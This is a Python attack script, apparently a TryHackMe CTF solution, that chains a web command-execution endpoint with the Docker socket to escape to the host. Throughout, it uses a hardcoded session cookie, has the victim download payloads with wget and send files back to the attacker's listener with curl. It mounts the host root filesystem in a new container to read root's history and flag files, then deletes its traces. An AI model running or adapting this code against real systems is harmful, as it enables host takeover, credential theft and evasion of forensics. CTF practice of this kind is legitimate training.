#!/usr/bin/env python3
"""
Docker Socket Escape Tool
CTF: thenewyorkflankees (TryHackMe)
Usage: python3 docker_escape.py "command to run on host"
       python3 docker_escape.py  (runs predefined commands)
"""

import requests
import json
import threading
import time
import sys
import os
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── CONFIG ────────────────────────────────────────────────────────────────────
TARGET      = os.environ.get("TARGET", "0.0.0.x")
TARGET_PORT = 8080
LHOST       = os.environ.get("LHOST", "192.x.x.x")
LPORT       = 8888
SESSION     = os.environ.get("SESSION", "ee10e9985e4ba185c8d00fa0bba86db507380ef6ca89c7f34366622ac779716a")
IMAGE       = "padding-oracle-app_web"
DOCKER_SOCK = "/run/docker.sock"
COOKIE      = f"session={SESSION}; loggedin=true"
BASE_URL    = f"http://{TARGET}:{TARGET_PORT}/api/admin/exec"

# ── HTTP SERVER ───────────────────────────────────────────────────────────────
served   = {}   # filename -> content to serve
received = {}   # key -> received POST body

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        name = self.path.lstrip("/")
        if name in served:
            data = served[name].encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode(errors="replace")
        key = self.path.lstrip("/")
        received[key] = body
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass  # silence server logs

def start_http_server():
    srv = HTTPServer(("0.0.0.0", LPORT), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

# ── RCE HELPERS ───────────────────────────────────────────────────────────────
def rce(cmd, timeout=15):
    """Execute a command on the target via GET ?cmd= parameter"""
    try:
        r = requests.get(BASE_URL,
                         params={"cmd": cmd},
                         headers={"Cookie": COOKIE},
                         timeout=timeout)
        return r.status_code == 200
    except Exception as e:
        print(f"  [!] RCE error: {e}")
        return False

def wait_for(key, timeout=10):
    """Wait for a POST to arrive at the given key"""
    for _ in range(timeout * 10):
        if key in received:
            return received.pop(key)
        time.sleep(0.1)
    return None

def exfil(remote_path, key, timeout=10):
    """Exfiltrate a remote file via POST to our HTTP server"""
    rce(f"curl -X POST --data-binary @{remote_path} http://{LHOST}:{LPORT}/{key}")
    return wait_for(key, timeout)

def serve_and_download(filename, content, remote_path):
    """Serve a JSON payload and download it on the victim via wget"""
    served[filename] = content
    time.sleep(0.3)
    rce(f"wget http://{LHOST}:{LPORT}/{filename} -O {remote_path}")
    time.sleep(1)

def docker_api(endpoint, method="GET", data_file=None, out_file=None):
    """Call Docker API via unix socket on the victim"""
    cmd = f"curl --unix-socket {DOCKER_SOCK} -X {method}"
    if data_file:
        cmd += f" -H Content-Type:application/json --data-binary @{data_file}"
    if out_file:
        cmd += f" -o {out_file}"
    cmd += f" http://localhost{endpoint}"
    rce(cmd)
    time.sleep(1)

# ── STEPS ─────────────────────────────────────────────────────────────────────
def create_container():
    """Create a new container with the host filesystem mounted at /mnt/host"""
    print("[1] Creating container with host mounted at /mnt/host ...")
    payload = json.dumps({
        "Image": IMAGE,
        "Entrypoint": ["/bin/sh", "-c"],
        "Cmd": ["sleep 300"],
        "Binds": ["/:/mnt/host"]
    })
    serve_and_download("psleep.json", payload, "/tmp/psleep.json")
    docker_api("/containers/create", method="POST",
               data_file="/tmp/psleep.json", out_file="/tmp/sleepid.json")
    raw = exfil("/tmp/sleepid.json", "sleepid")
    if not raw:
        print("  [!] No response received")
        return None
    try:
        cid = json.loads(raw)["Id"]
        print(f"  [+] Container ID: {cid[:16]}...")
        return cid
    except Exception as e:
        print(f"  [!] Parse error: {e} | Raw: {raw}")
        return None

def start_container(cid):
    """Start the container"""
    print(f"[2] Starting container {cid[:16]}...")
    docker_api(f"/containers/{cid}/start", method="POST")
    time.sleep(2)
    print("  [+] Container started")

def create_exec(cid, command):
    """Create an exec instance inside the running container"""
    print(f"[3] Creating exec: {command}")
    payload = json.dumps({
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", command]
    })
    serve_and_download("execp.json", payload, "/tmp/execp.json")
    docker_api(f"/containers/{cid}/exec", method="POST",
               data_file="/tmp/execp.json", out_file="/tmp/execid.json")
    raw = exfil("/tmp/execid.json", "execid")
    if not raw:
        print("  [!] No exec ID received")
        return None
    try:
        eid = json.loads(raw)["Id"]
        print(f"  [+] Exec ID: {eid[:16]}...")
        return eid
    except Exception as e:
        print(f"  [!] Parse error: {e} | Raw: {raw}")
        return None

def run_exec(eid):
    """Start the exec instance and exfiltrate its output"""
    print(f"[4] Running exec {eid[:16]}...")
    rce(f"curl --unix-socket {DOCKER_SOCK} -X POST "
        f"-H Content-Type:application/json -d {{}} "
        f"-o /tmp/execout.txt "
        f"http://localhost/exec/{eid}/start")
    time.sleep(2)
    raw = exfil("/tmp/execout.txt", "execout")
    return raw

def cleanup(cid):
    """Stop and remove the container, delete temp files on the victim"""
    print(f"\n[5] Cleaning up traces...")
    # Stop the container
    docker_api(f"/containers/{cid}/stop", method="POST")
    time.sleep(2)
    # Delete the container
    docker_api(f"/containers/{cid}", method="DELETE")
    time.sleep(1)
    # Remove temp files from victim /tmp
    rce("rm -f /tmp/psleep.json /tmp/sleepid.json /tmp/execp.json /tmp/execid.json /tmp/execout.txt")
    print("  [+] Container removed")
    print("  [+] /tmp cleaned on victim")

# ── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    print("=" * 58)
    print("  Docker Socket Escape — thenewyorkflankees (THM)")
    print("=" * 58)
    print(f"  Target : {TARGET}:{TARGET_PORT}")
    print(f"  LHOST  : {LHOST}:{LPORT}")
    print()

    start_http_server()
    print("[*] HTTP server running\n")

    # Use CLI argument or fall back to predefined command list
    if len(sys.argv) > 1:
        commands = [("output", " ".join(sys.argv[1:]))]
    else:
        commands = [
            ("ls_root",      "ls -la /mnt/host/root/"),
            ("bash_history", "cat /mnt/host/root/.bash_history"),
            ("user_flag",    "find /mnt/host/home -name '*.txt' 2>/dev/null -exec cat {} \\;"),
            ("root_flag",    "find /mnt/host/root -name '*.txt' 2>/dev/null -exec cat {} \\;"),
        ]

    cid = create_container()
    if not cid:
        print("[!] Failed to create container. Exiting.")
        sys.exit(1)

    start_container(cid)

    try:
        for name, cmd in commands:
            print(f"\n{'─'*50}")
            eid = create_exec(cid, cmd)
            if not eid:
                continue
            out = run_exec(eid)
            print(f"\n[+] [{name}]:")
            print(out.strip() if out and out.strip() else "(empty)")
    finally:
        # Always clean up, even if an error occurs
        cleanup(cid)
        print(f"\n{'='*58}")
        print("[*] Done.")

if __name__ == "__main__":
    main()
